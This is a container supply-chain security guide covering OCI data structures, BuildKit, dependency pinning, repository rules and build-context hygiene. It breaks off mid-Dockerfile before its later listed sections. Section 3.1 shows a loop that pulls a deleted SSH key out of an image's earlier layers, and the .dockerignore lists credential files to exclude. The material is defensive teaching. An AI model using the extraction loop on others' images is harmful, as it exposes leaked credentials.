# Container Image Supply Chain, Inside Out
### OCI images, layers, BuildKit, SBOM, provenance, signing (Sigstore & Notation), GitHub Actions, and Kyverno admission

*Written October 2026. Tool versions move fast — every version pin in this guide is a starting point; check the upstream release page before you copy it.*

---

## Table of contents

0. [What you are building](#0-what-you-are-building)
1. [Threat model: what each control actually proves](#1-threat-model-what-each-control-actually-proves)
2. [OCI internals: the data model under every image](#2-oci-internals-the-data-model-under-every-image)
3. [Layers in depth](#3-layers-in-depth)
4. [BuildKit and buildx internals](#4-buildkit-and-buildx-internals)
5. [Build control, part 1: source and dependencies](#5-build-control-part-1-source-and-dependencies)
6. [Build control, part 2: the Dockerfile](#6-build-control-part-2-the-dockerfile)
7. [Build control, part 3: GitHub Actions hardening](#7-build-control-part-3-github-actions-hardening)
8. [SBOM](#8-sbom)
9. [Provenance (SLSA + in-toto)](#9-provenance-slsa--in-toto)
10. [Signing: Sigstore/cosign vs Notary Project/Notation](#10-signing-sigstorecosign-vs-notary-projectnotation)
11. [The pipeline, end to end](#11-the-pipeline-end-to-end)
12. [Verification and Kyverno admission](#12-verification-and-kyverno-admission)
13. [Top-1% topics, failure modes and gotchas](#13-top-1-topics-failure-modes-and-gotchas)
14. [Hands-on labs](#14-hands-on-labs)
15. [Appendix A — `inspect_image.py` (full source)](#appendix-a--inspect_imagepy-full-source)
16. [Appendix B — Glossary](#appendix-b--glossary)
17. [Appendix C — References](#appendix-c--references)

---

## 0. What you are building

Your stated goal was: *build multi-arch → produce OCI artifacts → Python checks on layers → sign → provenance → SBOM → push*. That's almost right. One reordering is forced on you by how registries work, and understanding *why* is the first "inside-out" lesson:

> **Signatures, SBOM attestations and provenance attestations are not stored *inside* the image. They are separate registry objects that point *at* the image's digest.** Something that points at a digest in a registry needs that digest to exist in the registry first.

So the correct shape is: **build locally to an OCI layout → gate it → push by digest to a non-release ("quarantine") tag → sign + attest that exact digest → promote (add release tags) → verify**. Because OCI content is addressed by hash, the digest you inspected locally is *bit-for-bit* the digest you push, sign and admit — the pipeline proves that at every step.

```
 ┌──────────────── job: build (untrusted code runs here, NO signing creds) ─────────────────┐
 │ checkout ─► lint Dockerfile pins ─► buildx build --platform amd64,arm64                   │
 │            --output type=oci,dest=out/layout   --sbom=true --provenance=mode=max          │
 │            ─► tar + sha256 the layout ─► upload artifact                                   │
 └───────────────────────────────────────────────┬─────────────────────────────────────────┘
                                                 ▼
 ┌──────────────── job: gate (no creds) ────────────────────────────────────────────────────┐
 │ verify artifact sha256 ─► inspect_image.py (digests, diffIDs, secrets, setuid, root,      │
 │ whiteouts, labels, base-image allowlist, SBOM/provenance present) ─► grype on SBOMs       │
 │ ─► outputs: index digest, per-platform digests, gate-report.json, SBOM files             │
 └───────────────────────────────────────────────┬─────────────────────────────────────────┘
                                                 ▼
 ┌──────────────── job: publish (environment: production; id-token, packages:write) ────────┐
 │ skopeo copy --preserve-digests ─► :ci-<run>  ─► assert remote digest == gated digest       │
 │ cosign sign (keyless, OIDC)   ─► cosign attest SBOM (per platform)                         │
 │ cosign attest gate-report     ─► actions/attest-build-provenance (SLSA v1)                 │
 │ (optional) notation sign via KMS plugin                                                    │
 │ promote: add :1.2.3, :sha-<git> tags to the SAME digest ─► assert tags resolve to digest   │
 └───────────────────────────────────────────────┬─────────────────────────────────────────┘
                                                 ▼
 ┌──────────────── job: verify ──────┐     ┌──────────── cluster ───────────────────────────┐
 │ cosign verify / verify-attestation │     │ Kyverno ImageValidatingPolicy:                  │
 │ gh attestation verify              │     │  tag→digest, signature by release workflow,     │
 └────────────────────────────────────┘     │  SBOM present, provenance repo/ref, gate=pass   │
                                            └─────────────────────────────────────────────────┘
```

Repository layout used throughout:

```
.
├── .github/
│   ├── CODEOWNERS
│   └── workflows/
│       ├── ci.yml            # PR builds: build + gate only, never sign
│       └── release.yml       # tag builds: build → gate → publish → verify
├── ci/
│   ├── inspect_image.py      # the layer/config/attestation gate (Appendix A)
│   ├── image-policy.json     # gate thresholds/allowlists
│   └── check_dockerfile_pins.py
├── deploy/kyverno/
│   ├── ivpol-cosign.yaml
│   └── ivpol-notary.yaml
├── cmd/app/main.go
├── go.mod / go.sum
├── Dockerfile
├── .dockerignore
└── renovate.json
```

---

## 1. Threat model: what each control actually proves

Most "supply chain security" confusion comes from not knowing what question each artifact answers. Memorise this table.

| Artifact | Question it answers | What it does **not** prove |
|---|---|---|
| **Digest** (`sha256:…`) | "Is this exactly the bytes I mean?" | Who made it, whether it's safe |
| **Signature** | "Did an identity I trust vouch for this digest?" | How it was built, what's inside |
| **Provenance** (SLSA) | "Which builder, from which source commit, with which inputs/params, produced this digest?" | That the source code is good; that deps are safe |
| **SBOM** | "What components (packages, versions, licenses) are inside?" | That the list is complete; that components are safe |
| **Vulnerability report / VEX** | "Which known CVEs affect it, and which are not exploitable?" | Unknown vulns; it decays daily |
| **Custom attestation** (e.g. your gate report) | "Did our policy checks pass for this digest, at build time?" | Anything you didn't check |
| **Admission policy** | "Does the cluster refuse anything that lacks the above?" | Runtime behaviour |

Threats, mapped to the [SLSA](https://slsa.dev) framing:

| # | Threat | Example | Control in this guide |
|---|---|---|---|
| A | Unreviewed source change | Direct push to `main`, malicious PR | Rulesets, CODEOWNERS, required reviews (§5) |
| B | Compromised source repo / tag moved | Force-pushed tag | Tag rulesets, provenance pins `sourceRepository` + commit (§9) |
| C | Compromised build | Poisoned cache, malicious action, injected step | Pinned actions, job isolation, ephemeral runners, SLSA L3 (§7) |
| D | Compromised dependency | Typosquat, hijacked base image | Lockfiles with hashes, base-image digest pins + allowlist, SBOM + scan (§5, §8) |
| E | Upload of artifact not from CI | Engineer pushes from laptop | Signature identity = *the release workflow*, not a person (§10) |
| F | Registry compromise / tag mutation | `:latest` swapped | Digest pinning, `mutateDigest`, signatures verified on digest (§12) |
| G | Secrets leaked in image | `COPY . .` picks up `.env`; build-arg token in history | `.dockerignore`, `--mount=type=secret`, gate script (§6, §11) |
| H | Deploy of old vulnerable but validly-signed image | Rollback to 2-year-old tag | Signature/attestation freshness, vuln attestation age (§13) |

**SLSA Build track levels** (v1.x):
- **L1** — provenance exists (BuildKit's built-in provenance gets you this).
- **L2** — provenance is *signed* by a hosted build platform (GitHub artifact attestations, Sigstore-signed).
- **L3** — build platform is hardened so the build *can't forge its own provenance*: signing material is not accessible to user-defined build steps, runs are isolated. In GitHub, achieved by generating provenance in a **reusable workflow** the caller can't tamper with (e.g. `slsa-framework/slsa-github-generator`), or GitHub's own attest action invoked from a reusable workflow you trust. Our job split (build has no `id-token`) gets you most of the way.

---

## 2. OCI internals: the data model under every image

### 2.1 Content addressing

Everything in OCI is a **blob** identified by a **digest**: `algorithm:hex`, almost always `sha256:<64 hex>`. The digest is the hash of the exact bytes. Change one byte (even JSON whitespace, or gzip compression level) and you have a different object.

Consequences you must internalise:
- A **tag** is a mutable pointer (`name → digest`). A **digest** is immutable identity.
- You sign **digests**, never tags.
- Two registries holding the same bytes have the same digest — that's why you can copy images and keep signatures valid.
- Re-serialising a manifest (e.g. some tools pretty-print, reorder keys, or recompress layers) changes the digest and *invalidates every signature*. Use tools that copy bytes verbatim (`skopeo --preserve-digests`, `crane copy`, `oras cp`, `regctl image copy`).

### 2.2 The descriptor

The unit of reference. Every pointer in OCI is a descriptor:

```json
{
  "mediaType": "application/vnd.oci.image.manifest.v1+json",
  "digest": "sha256:0ac2c1a056b9e774d51588b82dda7e3b58e194023e4c1386c6e2e6e113b603d6",
  "size": 1093,
  "platform": { "os": "linux", "architecture": "arm64" },
  "annotations": { "org.opencontainers.image.ref.name": "1.2.3" },
  "artifactType": "application/vnd.example+json"
}
```

`size` matters: clients use it to bound reads and refuse oversized blobs (a defence against registry-side resource exhaustion). `mediaType` tells the client how to parse what it fetches.

### 2.3 The four core objects

```
                  ┌─────────────────────────────── Image Index (multi-arch) ──────┐
 tag :1.2.3 ────► │ mediaType: application/vnd.oci.image.index.v1+json           │  ← this digest is what you sign
                  │ manifests: [ amd64 manifest, arm64 manifest,                 │
                  │              attestation manifest(s) unknown/unknown ]       │
                  └──────────┬──────────────────────────────┬─────────────────────┘
                             ▼                              ▼
          ┌──────── Image Manifest (linux/amd64) ──┐   ┌── Image Manifest (linux/arm64) ──┐
          │ config:  descriptor → config blob      │   │ …                                │
          │ layers: [descriptor, descriptor, …]    │   └──────────────────────────────────┘
          └──────┬───────────────────────┬─────────┘
                 ▼                       ▼
   ┌─── Image Config (JSON) ───┐   ┌── Layer blobs (tar+gzip / tar+zstd) ──┐
   │ architecture, os          │   │ filesystem changesets                  │
   │ config: User, Env, Cmd…   │   └────────────────────────────────────────┘
   │ rootfs.diff_ids [ … ]     │
   │ history [ … ]             │
   └───────────────────────────┘
```

**Image manifest** (one platform):

```json
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.manifest.v1+json",
  "config": {
    "mediaType": "application/vnd.oci.image.config.v1+json",
    "digest": "sha256:a3f1…",
    "size": 1470
  },
  "layers": [
    { "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip", "digest": "sha256:9b1e…", "size": 803251 },
    { "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip", "digest": "sha256:44c0…", "size": 7340032 }
  ],
  "annotations": {
    "org.opencontainers.image.created": "2026-10-13T00:00:00Z",
    "org.opencontainers.image.source": "https://github.com/acme/app",
    "org.opencontainers.image.revision": "6f1c2e…"
  }
}
```

**Image config** (this is what `docker inspect` mostly shows):

```json
{
  "architecture": "arm64",
  "os": "linux",
  "created": "2026-10-13T00:00:00Z",
  "config": {
    "User": "65532:65532",
    "Env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "Entrypoint": ["/app"],
    "WorkingDir": "/",
    "Labels": { "org.opencontainers.image.source": "https://github.com/acme/app" }
  },
  "rootfs": {
    "type": "layers",
    "diff_ids": ["sha256:1d2f…(uncompressed layer 0)", "sha256:77ab…(uncompressed layer 1)"]
  },
  "history": [
    { "created": "2026-10-13T00:00:00Z", "created_by": "COPY /out/app /app # buildkit", "comment": "buildkit.dockerfile.v0" },
    { "created": "2026-10-13T00:00:00Z", "created_by": "USER 65532:65532", "empty_layer": true }
  ]
}
```

Note: the config digest is the **image ID** that `docker images` shows (truncated). The **manifest digest** is what registries/k8s use (`image@sha256:…`). They are different things — a classic interview question.

**Image index** (multi-arch, "manifest list" in Docker terms):

```json
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.index.v1+json",
  "manifests": [
    { "mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": "sha256:0ac2…", "size": 1093,
      "platform": { "os": "linux", "architecture": "amd64" } },
    { "mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": "sha256:43d3…", "size": 1093,
      "platform": { "os": "linux", "architecture": "arm64" } },
    { "mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": "sha256:b7c9…", "size": 840,
      "platform": { "os": "unknown", "architecture": "unknown" },
      "annotations": {
        "vnd.docker.reference.type": "attestation-manifest",
        "vnd.docker.reference.digest": "sha256:0ac2…"
      } }
  ]
}
```

That `unknown/unknown` entry is BuildKit storing its SBOM/provenance *inside the index* (§4.6). Runtimes skip it because the platform matches nothing.

### 2.4 Docker vs OCI media types

| Object | Docker v2 schema 2 | OCI |
|---|---|---|
| Index | `application/vnd.docker.distribution.manifest.list.v2+json` | `application/vnd.oci.image.index.v1+json` |
| Manifest | `application/vnd.docker.distribution.manifest.v2+json` | `application/vnd.oci.image.manifest.v1+json` |
| Config | `application/vnd.docker.container.image.v1+json` | `application/vnd.oci.image.config.v1+json` |
| Layer | `application/vnd.docker.image.rootfs.diff.tar.gzip` | `application/vnd.oci.image.layer.v1.tar+gzip` / `+zstd` / `.tar` |

Use OCI media types (`buildx --output …,oci-mediatypes=true`; the `oci` exporter does this by default). Docker media types can't carry `annotations` on the index the same way and can't express zstd.

### 2.5 Layers: digest vs diffID vs chainID

- **Layer digest** = sha256 of the **compressed** blob (what the registry stores, what the manifest lists).
- **diffID** = sha256 of the **uncompressed** tar (what the config's `rootfs.diff_ids` lists). The runtime verifies this after decompression — it's what binds the config (and hence the image ID) to the actual filesystem content regardless of compression.
- **chainID** = recursive hash identifying a *stack* of layers: `chainID(L0)=diffID(L0)`, `chainID(L0..Ln)=sha256(chainID(L0..Ln-1) + " " + diffID(Ln))`. containerd snapshotters key unpacked snapshots on chainIDs so identical stacks are shared on disk.

Why this matters for you: the same filesystem compressed differently (gzip level, zstd, pigz vs Go gzip) yields **different layer digests, same diffIDs**. Your gate script recomputes diffIDs to catch a manifest/config mismatch (a corruption or tampering indicator).

### 2.6 OCI 1.1: artifacts, `subject`, and the Referrers API

OCI image-spec/distribution-spec **v1.1** (2024) is what makes modern signing work:

- **`artifactType`** on a manifest says "this is not a runnable image, it's an SBOM / signature / whatever".
- **`subject`** on a manifest says "I *refer to* this other manifest". That's how a signature points at an image.
- **Referrers API**: `GET /v2/<name>/referrers/<digest>?artifactType=…` returns an index of everything whose `subject` is `<digest>`.

A signature or attestation stored this way:

```json
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.manifest.v1+json",
  "artifactType": "application/vnd.dev.sigstore.bundle.v0.3+json",
  "config": { "mediaType": "application/vnd.oci.empty.v1+json", "digest": "sha256:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a", "size": 2 },
  "layers": [
    { "mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json", "digest": "sha256:…", "size": 5120 }
  ],
  "subject": {
    "mediaType": "application/vnd.oci.image.index.v1+json",
    "digest": "sha256:7333…",
    "size": 1712
  },
  "annotations": { "dev.sigstore.bundle.predicateType": "https://sigstore.dev/cosign/sign/v1" }
}
```

(`sha256:4413…` is the digest of the 2-byte `{}` "empty descriptor" — you'll see it everywhere.)

**Fallback tag schema**: registries without the Referrers API get a tag named `sha256-<hex>` holding an index of referrers, maintained client-side. Cosign (pre-v3 default) used tags like `sha256-<hex>.sig` and `.att`. You'll see both in the wild. Check your registry: Docker Hub, ECR, ACR, GAR, Harbor, Zot and `distribution` v3 support referrers; for GHCR verify current behaviour yourself (historically it relied on the fallback tag).

### 2.7 The Distribution API by hand

Knowing the HTTP layer makes every tool demystified. Against a local registry (lab in §14):

```bash
REG=localhost:5000 REPO=demo/app

# list tags
curl -s http://$REG/v2/$REPO/tags/list | jq

# fetch the index (Accept matters! wrong Accept → registry may convert or 404)
curl -s -H 'Accept: application/vnd.oci.image.index.v1+json' \
     http://$REG/v2/$REPO/manifests/1.0 | tee index.json | jq

# the digest of what you fetched == sha256 of the raw bytes
sha256sum index.json
curl -sI -H 'Accept: application/vnd.oci.image.index.v1+json' \
     http://$REG/v2/$REPO/manifests/1.0 | grep -i docker-content-digest

# fetch a platform manifest, then its config and a layer
curl -s -H 'Accept: application/vnd.oci.image.manifest.v1+json' \
     http://$REG/v2/$REPO/manifests/sha256:<amd64-digest> | jq
curl -s http://$REG/v2/$REPO/blobs/sha256:<config-digest> | jq
curl -s http://$REG/v2/$REPO/blobs/sha256:<layer-digest> | tar -tzv | head

# referrers (OCI 1.1)
curl -s http://$REG/v2/$REPO/referrers/sha256:<index-digest> | jq
```

Push protocol, conceptually: `POST /v2/<repo>/blobs/uploads/` → `PUT …?digest=sha256:…` for each blob (or cross-repo `mount`), then `PUT /v2/<repo>/manifests/<tag-or-digest>`. Registries **reject** a manifest whose referenced blobs don't exist (except for `subject`, which may dangle).

### 2.8 Tool cheat-sheet

| Task | crane | skopeo | oras | regctl | docker buildx |
|---|---|---|---|---|---|
| Digest of a tag | `crane digest img:t` | `skopeo inspect --format '{{.Digest}}' docker://img:t` | `oras resolve img:t` | `regctl image digest img:t` | `docker buildx imagetools inspect img:t --format '{{.Manifest.Digest}}'` |
| Raw manifest | `crane manifest img` | `skopeo inspect --raw docker://img` | `oras manifest fetch img` | `regctl manifest get img --format raw-body` | `imagetools inspect --raw` |
| Config | `crane config img` | `skopeo inspect --config docker://img` | — | `regctl image config img` | — |
| Copy all arches verbatim | `crane copy a b` | `skopeo copy --all --preserve-digests docker://a docker://b` | `oras cp -r a b` | `regctl image copy a b` | ⚠ `imagetools create` may re-serialise |
| Copy incl. referrers | — | — | `oras cp -r` | `regctl image copy --referrers` | — |
| List referrers | — | — | `oras discover img@d` | `regctl artifact list img@d` | — |
| Attach an artifact | — | — | `oras attach --artifact-type T img@d file` | `regctl artifact put --subject img@d` | — |
| Export to OCI layout | `crane pull --format=oci img dir` | `skopeo copy docker://img oci:dir` | `oras cp --to-oci-layout` | `regctl image export` | `--output type=oci` |
| Flatten/inspect fs | `crane export img - \| tar t` | — | — | — | — |

---

## 3. Layers in depth

### 3.1 What a layer is

A layer is a **tar changeset** relative to the layers below: added/changed files are present; deleted files are represented by **whiteouts**:

- `dir/.wh.foo` — "`dir/foo` was deleted".
- `dir/.wh..wh..opq` — "opaque dir": ignore everything below from lower layers.

At runtime, containerd's overlayfs snapshotter unpacks each layer into its own directory and stacks them (`lowerdir=L2:L1:L0, upperdir=container-rw`). Whiteouts become overlayfs character devices `0:0`.

**The single most important security fact about layers:**

```dockerfile
COPY id_rsa /root/.ssh/id_rsa       # layer N contains the key
RUN  git clone … && rm /root/.ssh/id_rsa   # layer N+1 contains a whiteout
```

The final filesystem doesn't show the key, but **layer N is in the image forever** and anyone who can pull can extract it:

```bash
crane export ghcr.io/acme/app:bad - | tar -t | grep id_rsa      # not there (flattened view)
crane manifest ghcr.io/acme/app:bad | jq -r '.layers[].digest' | while read d; do
  crane blob ghcr.io/acme/app:bad@$d | tar -tz | grep -q id_rsa && echo "FOUND in $d"
done                                                                # there it is
```

The gate script detects exactly this (`layer.deleted-secret`). The fix is `RUN --mount=type=secret` / `--mount=type=ssh`, which never write to a layer.

### 3.2 Which instructions create layers

| Instruction | New layer? | Notes |
|---|---|---|
| `FROM` | inherits base layers | |
| `RUN`, `COPY`, `ADD` | yes | `--mount` content is **not** committed |
| `ENV`, `LABEL`, `USER`, `WORKDIR`*, `EXPOSE`, `ENTRYPOINT`, `CMD`, `ARG` | config/history only (`empty_layer: true`) | *`WORKDIR` creates the dir if missing → may produce a small layer |
| `COPY --link` | yes, **independent of base** | layer can be reused/rebased without re-running (great for cache) |

### 3.3 Layer ordering and caching

BuildKit cache keys depend on the instruction + inputs (file checksums for `COPY`, the command string + parent for `RUN`). Order from least- to most-frequently changing:

```dockerfile
COPY go.mod go.sum ./          # changes rarely
RUN go mod download            # cached until go.sum changes
COPY . .                       # changes every commit
RUN go build ...
```

### 3.4 Compression and its effect on digests

| Compression | Media type | Pros | Cons |
|---|---|---|---|
| gzip | `+gzip` | universal | slow decompress |
| zstd | `+zstd` | faster, smaller | needs containerd ≥1.5-ish, all your tooling must support it |
| eStargz | `+gzip` (special TOC) | lazy pull (stargz snapshotter) | niche |
| zstd:chunked | `+zstd` | lazy pull (Podman/CRI-O) | niche |

`buildx … --output type=image,compression=zstd,compression-level=3,force-compression=true`. Changing compression changes every layer digest → every manifest digest → new signatures needed. Pick once.

### 3.5 Reproducible builds

A reproducible build lets an independent party rebuild from the same source and get the **same digest** — the strongest possible provenance check (§13.1). Sources of non-determinism and fixes:

| Source | Fix |
|---|---|
| File mtimes in layers | `SOURCE_DATE_EPOCH` + exporter `rewrite-timestamp=true` (BuildKit ≥0.13) |
| `created` in config/history | `SOURCE_DATE_EPOCH` (buildx reads the env var and passes it) |
| Go build IDs / paths | `-trimpath -ldflags="-buildid="` |
| Package manager fetching "latest" | lockfiles with hashes, digest-pinned base images, snapshot repos (`snapshot.debian.org`) |
| Python `.pyc` timestamps | `PYTHONDONTWRITEBYTECODE=1` or `SOURCE_DATE_EPOCH` (pip/py_compile honour it) |
| tar ordering / uid/gid | BuildKit is deterministic here |
| gzip implementation | same BuildKit version |

Compare two builds with **`diffoci`** (`diffoci diff --semantic img1 img2`) to see exactly what differs.

---

## 4. BuildKit and buildx internals

### 4.1 Architecture

```
 buildx (client) ──gRPC──► buildkitd
                            ├─ frontend (dockerfile.v0, pinned via "# syntax=")  → converts Dockerfile to LLB
                            ├─ LLB graph (content-addressed DAG of ops: source, exec, file, merge, diff)
                            ├─ solver (dedupes + caches vertices, runs in parallel)
                            ├─ workers (runc/containerd, one per platform; QEMU via binfmt for emulation)
                            ├─ cache (local, inline, registry, gha, s3, azblob)
                            └─ exporters (image, registry, oci, docker, local, tar) + attestation generators
```

The `# syntax=docker/dockerfile:1` line makes BuildKit **pull the Dockerfile frontend as an image**. That's executable code in your build → pin it by digest (§6.1).

### 4.2 Drivers

| Driver | Multi-arch output | Attestations | Cache export | Use |
|---|---|---|---|---|
| `docker` | ⚠ only with containerd image store | limited | inline only | local dev |
| `docker-container` | ✅ | ✅ | all backends | **CI default** (`setup-buildx-action`) |
| `kubernetes` | ✅ | ✅ | ✅ | in-cluster builders |
| `remote` | ✅ | ✅ | ✅ | shared buildkitd |

### 4.3 Mounts (the key to secret-free layers)

```dockerfile
# cache: persists across builds on the same builder; never in the image
RUN --mount=type=cache,target=/root/.cache/go-build go build ./...

# bind: read-only view of build context or another stage; never in the image
RUN --mount=type=bind,source=go.sum,target=go.sum go mod download

# secret: file (default /run/secrets/<id>) or env var; never in a layer, never in history
RUN --mount=type=secret,id=npm_token,env=NPM_TOKEN npm ci

# ssh: forwards an agent socket
RUN --mount=type=ssh git clone git@github.com:acme/private.git
```

```bash
docker buildx build --secret id=npm_token,env=NPM_TOKEN --ssh default .
```

Contrast with the anti-pattern the gate catches:

```dockerfile
ARG NPM_TOKEN              # value appears in history as "RUN |1 NPM_TOKEN=xxxx /bin/sh -c …"
RUN npm ci                 # and in provenance (mode=max records build args!)
```

### 4.4 Multi-platform: three strategies

| Strategy | How | Speed | When |
|---|---|---|---|
| **Cross-compile** | Build stage `FROM --platform=$BUILDPLATFORM`, compile with `GOOS=$TARGETOS GOARCH=$TARGETARCH` | ⚡ fastest, single runner | Go, Rust (with targets), Node/JVM (arch-independent) |
| **QEMU emulation** | `docker/setup-qemu-action`, `RUN` steps execute under binfmt | 🐢 5–20× slower | arch-specific native deps, small builds |
| **Native runners + merge** | matrix on `ubuntu-24.04` + `ubuntu-24.04-arm`, push-by-digest, merge with `imagetools create` | ⚡ fast, more plumbing | Python/C extensions, heavy builds |

Automatic platform `ARG`s (declare them in the stage that uses them):
`BUILDPLATFORM BUILDOS BUILDARCH BUILDVARIANT TARGETPLATFORM TARGETOS TARGETARCH TARGETVARIANT`.

Rule of thumb: if your final stage only `COPY`s (no `RUN`), you need no emulation at all for the target platform.

### 4.5 Exporters / outputs

```bash
--output type=image,name=ghcr.io/acme/app:t,push=true             # build + push (what --push does)
--output type=image,name=…,push-by-digest=true,name-canonical=true # push without a tag (matrix pattern)
--output type=oci,dest=out/image.tar                               # OCI layout tarball
--output type=oci,dest=out/layout,tar=false                        # OCI layout directory  ← we use this
--output type=docker,dest=out/img.tar                              # docker-load format (single platform)
--output type=local,dest=out/fs                                    # raw filesystem (no image)
# common attributes: oci-mediatypes=true, compression=zstd, rewrite-timestamp=true, annotation.<k>=<v>
```

### 4.6 BuildKit attestations

```bash
docker buildx build --sbom=true --provenance=mode=max …
# equivalent long form:
#   --attest type=sbom[,generator=docker/buildkit-syft-scanner:<ver>]
#   --attest type=provenance,mode=max
```

- **SBOM**: BuildKit runs a scanner image (default `docker/buildkit-syft-scanner`, i.e. Syft) against the final stage → SPDX JSON. Add to the Dockerfile to also scan the build context / intermediate stages:
  ```dockerfile
  ARG BUILDKIT_SBOM_SCAN_CONTEXT=true
  ARG BUILDKIT_SBOM_SCAN_STAGE=true    # in each stage you want scanned
  ```
- **Provenance**: SLSA provenance (v0.2 by default historically; newer BuildKit can emit v1 via `version=v1` — check your version). `mode=min` = no build args/secrets names; `mode=max` = full LLB definition, build args, Dockerfile source. **mode=max records build-arg values** — another reason to never pass secrets as build args.
- Both are stored as in-toto statements in the **attestation manifest** (`unknown/unknown`) in the index, pointing to their platform manifest via `vnd.docker.reference.digest`.
- They are **not signed**. They're useful data (our gate reads them) but not trust anchors. Trust comes from re-attesting them with a signature (§11).

Inspect them:

```bash
docker buildx imagetools inspect ghcr.io/acme/app:1.2.3 --format '{{ json .Provenance }}' | jq
docker buildx imagetools inspect ghcr.io/acme/app:1.2.3 --format '{{ json .SBOM }}' | jq '.SPDX.packages | length'
```

### 4.7 Cache and cache poisoning

`cache-from`/`cache-to` (`type=gha`, `type=registry,ref=…:buildcache`) can make releases fast — but a cache written by a PR build from a fork could be consumed by a release build. Rules:
- Release builds: `no-cache: true` (or a cache scope only writable from protected branches).
- PR builds: separate `scope=pr-${{ github.event.number }}`.
- GitHub's `gha` cache is scoped by branch with read-fallback to the default branch; a PR can't write to `main`'s scope, but your release tag *can* read `main`'s scope — so whoever can push to `main` can poison releases. That's acceptable only if `main` is protected.

---

## 5. Build control, part 1: source and dependencies

"Build control first" means: the image is only as trustworthy as the weakest thing that can influence the bytes. Start upstream.

### 5.1 Repository controls (GitHub rulesets)

Configure an org-level **ruleset** for `main` and for tags `v*`:

| Rule | Branch `main` | Tags `v*` |
|---|---|---|
| Restrict deletions / force pushes | ✅ | ✅ (tags immutable) |
| Require PR + ≥1 approval, dismiss stale approvals | ✅ | — |
| Require review from Code Owners | ✅ | — |
| Require status checks (`ci / build-and-gate`) | ✅ | — |
| Require signed commits | ✅ (gitsign or SSH/GPG) | — |
| Restrict creation | — | ✅ only release managers/bot |
| Require linear history / merge queue | recommended | — |

`.github/CODEOWNERS` — make the supply-chain-critical files require the platform team:

```
# Anything that controls how the image is built or signed
/.github/                 @acme/platform-security
/Dockerfile               @acme/platform-security
/.dockerignore            @acme/platform-security
/ci/                      @acme/platform-security
/deploy/kyverno/          @acme/platform-security
/go.mod                   @acme/app-owners @acme/platform-security
/go.sum                   @acme/app-owners @acme/platform-security
```

Signed commits with Sigstore's `gitsign` (keyless, same identity system as cosign):

```bash
git config --local commit.gpgsign true
git config --local tag.gpgsign true
git config --local gpg.x509.program gitsign
git config --local gpg.format x509
```

### 5.2 Dependency pinning

**Base images by digest** — the tag is for humans (and Renovate), the digest is what's used:

```dockerfile
FROM golang:1.25-bookworm@sha256:<digest> AS build
FROM gcr.io/distroless/static-debian12:nonroot@sha256:<digest>
```

Get a digest: `crane digest golang:1.25-bookworm` (it's the index digest — correct, BuildKit selects the platform).

**Verify upstream signatures before you trust a base image** (do this when Renovate bumps it, in a CI step):

```bash
# distroless is signed keylessly by its release workflow
cosign verify gcr.io/distroless/static-debian12:nonroot \
  --certificate-oidc-issuer https://accounts.google.com \
  --certificate-identity keyless@distroless.iam.gserviceaccount.com
# Chainguard images
cosign verify cgr.dev/chainguard/static:latest \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  --certificate-identity-regexp '^https://github.com/chainguard-images/images/'
```

(Identities above are what those projects documented at time of writing; confirm against their docs.)

**Language deps with hashes**:

```bash
# Go: go.sum already pins hashes; enforce with GOFLAGS=-mod=readonly and GONOSUMDB/GOPRIVATE set properly
# Python:
pip-compile --generate-hashes -o requirements.txt requirements.in
pip install --require-hashes --no-deps -r requirements.txt
# or uv:
uv lock && uv sync --frozen
# Node:
npm ci             # uses package-lock.json integrity hashes
```

**Renovate** keeps pins fresh (pinning without automated updates = slowly rotting images):

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended", "docker:pinDigests", "helpers:pinGitHubActionDigests"],
  "packageRules": [
    { "matchDatasources": ["docker"], "matchUpdateTypes": ["digest"], "automerge": true, "schedule": ["before 6am on monday"] },
    { "matchManagers": ["github-actions"], "groupName": "github-actions" }
  ]
}
```

**Lint pins in CI** — `ci/check_dockerfile_pins.py`:

```python
#!/usr/bin/env python3
"""Fail if any FROM / COPY --from= image or the # syntax= frontend is not pinned by digest."""
import re
import sys

path = sys.argv[1] if len(sys.argv) > 1 else "Dockerfile"
stages, bad = set(), []
from_rx = re.compile(r"^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?", re.I)
copy_rx = re.compile(r"--from=(\S+)", re.I)

with open(path) as fh:
    for n, line in enumerate(fh, 1):
        if n == 1 and line.startswith("# syntax=") and "@sha256:" not in line:
            bad.append((n, line.strip()))
        if m := from_rx.match(line):
            img, alias = m.group(1), m.group(2)
            if img.lower() not in stages and img != "scratch" and "@sha256:" not in img:
                bad.append((n, img))
            if alias:
                stages.add(alias.lower())
        elif line.lstrip().upper().startswith("COPY") and (m := copy_rx.search(line)):
            ref = m.group(1)
            if ref.lower() not in stages and not ref.isdigit() and "@sha256:" not in ref:
                bad.append((n, ref))

for n, ref in bad:
    print(f"{path}:{n}: unpinned image reference: {ref}")
sys.exit(1 if bad else 0)
```

### 5.3 Build context hygiene

`.dockerignore` is a security control — `COPY . .` sends *everything* not ignored:

```gitignore
# deny by default, allow what the build needs
*
!cmd/
!internal/
!go.mod
!go.sum
# never, even if someone adds a broad allow later
**/.git
**/.env*
**/*.pem
**/*.key
**/id_*
**/.aws
**/.kube
**/*.tfstate*
```

---

## 6. Build control, part 2: the Dockerfile

### 6.1 Production Go Dockerfile (cross-compiled, multi-arch, distroless, reproducible)

```dockerfile
# syntax=docker/dockerfile:1.19@sha256:<digest-of-frontend>
# ^ pin the frontend: it is code that runs in your build. (Check latest 1.x tag.)

ARG GO_VERSION=1.25

############################
# build stage: runs on the BUILD platform (no emulation), cross-compiles
############################
FROM --platform=$BUILDPLATFORM golang:${GO_VERSION}-bookworm@sha256:<digest> AS build
ARG BUILDKIT_SBOM_SCAN_STAGE=true
WORKDIR /src
ENV CGO_ENABLED=0 GOFLAGS="-trimpath -mod=readonly"

# deps layer: only re-runs when go.mod/go.sum change
